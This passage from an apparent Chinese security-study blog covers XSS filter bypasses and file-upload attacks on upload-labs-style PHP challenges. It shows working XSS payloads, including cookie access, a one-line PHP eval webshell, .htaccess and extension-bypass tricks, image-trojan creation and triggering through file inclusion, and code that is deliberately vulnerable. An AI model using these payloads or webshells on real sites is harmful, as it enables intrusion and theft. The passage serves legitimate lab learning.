title="一些常见绕过"></a>一些常见绕过</h3><p>针对XSS攻击，网站一般会对用户输入进行过滤,那么我们可以进行一些常见的绕过</p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只过滤了<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">标签,可以尝试<span class="tag">&lt;<span class="name">scRipt</span>&gt;</span>绕过</span></span></span><br></pre></td></tr></table></figure><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>可以尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;</span><br></pre></td></tr></table></figure><p>因为将中间的script替换为空，剩下的结合后又是script可以成功绕过。</p><h4 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span> <span class="comment">&lt;!--加载svg图片时执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span> <span class="comment">&lt;!--通过js伪协议执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.cookie)</span>&gt;</span>xxs link<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!--光标移动到xss link超链接上执行js代码&quot;alert(document.cookie)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!--点击link超链接通过js伪协议执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span> <span class="comment">&lt;!--通过故意引用不存在的图片触发onerror命令执行js代码&quot;alert(1)&quot;--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="HTML实体编码绕过"><a href="#HTML实体编码绕过" class="headerlink" title="HTML实体编码绕过"></a>HTML实体编码绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以不带分号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>网页中显示空格可以用&nbsp;<br>也可以用实体编码&#x20;</p><h4 id="内嵌tab"><a href="#内嵌tab" class="headerlink" title="内嵌tab"></a>内嵌tab</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">java&amp;#x09;script:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>防止javascrpt被过滤掉</p><h3 id="XSS平台获取cookie"><a href="#XSS平台获取cookie" class="headerlink" title="XSS平台获取cookie"></a>XSS平台获取cookie</h3><p><a href="https://blog.csdn.net/NSQ0207/article/details/131891269">https://blog.csdn.net/NSQ0207/article/details/131891269</a><br>可以参考这篇博客</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>服务端代码未对客户端上传的文件进行严格的验证，导致漏洞。</p><p>非法用户可以利用上传的恶意文件控制整个网站，这个恶意文件被称为WebShell，也可以称为一种网页后门</p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>我们可以先从最简单但是很实用的一句话木马介绍起</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ytm666&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么写个这样的php文件内容为一句话木马并上传到目标网站,就可以进行恶意操作</p><p>这样通过POST请求传给ytm666参数就可以执行任意php代码导致危害</p><p>例如执行system函数进行恶意操作,例如查看网页目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ytm666=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;dir&#x27;</span>);</span><br></pre></td></tr></table></figure><p>那么知道原理后我们就可以使用重量级的东西去远程连接webshell并进行不同的操作,例如利用蚁剑连接(其中添加数据时的密码就为POST请求的参数)</p><p>那么通过蚁剑可以查看网站的各种目录以及进行一系列操作</p><h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><h4 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h4><p>如果客户端js脚本有加限制(如不允许上传.php后缀的文件),可以直接使用burpsuite发送请求,通过先改为合法后缀名后上传,再更改burpsuite抓到的数据包中后缀名使php文件生效后进行发包植入后门</p><p>当然也可以直接禁用浏览器js绕过</p><h4 id="服务端文件类型检查-服务端MIME类型验证"><a href="#服务端文件类型检查-服务端MIME类型验证" class="headerlink" title="服务端文件类型检查(服务端MIME类型验证)"></a>服务端文件类型检查(服务端MIME类型验证)</h4><p>MIME类型是描述消息内容类型的因特网标准,可以利用Burp抓包，将报文中的Content-Type改成允许的类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="comment">//取出文件上传后临时存储的文件名</span></span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="comment">//生成一个新的文件存储路径，文件名保持文件上传前的文件名</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">        <span class="comment">//move_uploaded_file函数把上传的文件移动到新的位置，成功则返回true，失败则返回false</span></span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例如对于这道题的源码,我们就可以将其中修改<br><img src="https://img-blog.csdnimg.cn/20210522234227501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70" alt="1"></p><h4 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h4><p>如果.php后缀被限制，可以尝试这些后缀（webshell内容一样）：.phtml、.pht、.php3、.php4、.php5(前提是apache的httpd.conf中有如下配置代码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><hr><p>或者可以进行大小写绕过(<strong>后缀名大小写绕过原理</strong>：服务端没有将后缀名转换为统一格式进行比对，导致可以上传后缀为pHp的文件，又因为Windows操作系统大小写不敏感，所以.pHp扔回被当成PHP文件解析),例如对于这样的后端代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为在这段代码中没有出现能使文件名转为小写的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>这种情况下就可以考虑大小写绕过,比如上传后缀为pHP的文件</p><hr><p><strong>.phtml、.pht文件也可以这样写</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"> <span class="built_in">eval</span>($_POST[<span class="string">&#x27;ytm666&#x27;</span>]); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以绕过对于过滤文件中”&lt;?”部分的题目,通过用js标签声明php语言使其中的php代码生效并进行绕过</p><hr><p>.php、.phtml等很多后缀都被限制，可以尝试上传.htaccess文件（只支持apache服务器）</p><p>上传后，所在目录中名字包含png的文件将被当作php代码解析。例如这样的.htaccess文件:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;png&quot;</span>&gt; setHander application/x-httpd-php &lt;/<span class="title class_">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure><hr><p>有时我们遇到这样的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端将黑名单的后缀名替换为空,但仅进行一次,我们就可以尝试双写绕过,构造后缀名为.phphpp,那么后端替换php一次为空，则后缀就又为.php了</p><h4 id="图片马绕过"><a href="#图片马绕过" class="headerlink" title="图片马绕过"></a>图片马绕过</h4><p>对于这样的源码,如果绕过服务器文件文件头内容验证呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此先介绍一下文件头相关内容:</p><p>图片格式往往不是根据文件后缀名去做判断的。文件头是文件开头的一段二进制，不同的图片类型，文件头是不同的。文件头又称文件幻数。</p><p>常见文件幻数</p><ul><li><p>JPG: FF D8 FF EO 00 10 4A 46 49 46.</p></li><li><p>GIF:47 49 46 3839 61(GIF89a).</p></li><li><p>PNG:89 50 4E 47</p></li></ul><hr><p>那么对于上面这道题或者使用getimagesize()函数读取图片信息(必须有真实的图片内容),我们可以尝试使用图片马绕过:</p><p>先介绍下生成图片马的方法</p><ol><li><p>在路径下准备好一句话木马.php和一张图片 .png (或者 .jpg )</p></li><li><p>输入系统指令： copy 一张图片.png&#x2F;b+一句话木马.php&#x2F;a 生成图片名称.png</p></li></ol><p>  这样图片木马就合成好了</p><p>我们利用服务器将木马文件解析成了图片文件，但因此向其发送执行该文件的请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</p><p>接下来如何使这样的图片马生效呢</p><p>那么当然可以传之前介绍过的.htaccess文件,但是如果此文件不能上传,我们就可以选择使用<strong>文件包含</strong>漏洞来使其生效</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html:charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(_file_);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以构造url为:</p><p><code>http://xxx/include.php?file=upload/图片名称.png</code></p><h4 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h4><p>例如对于upload-labs第五题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 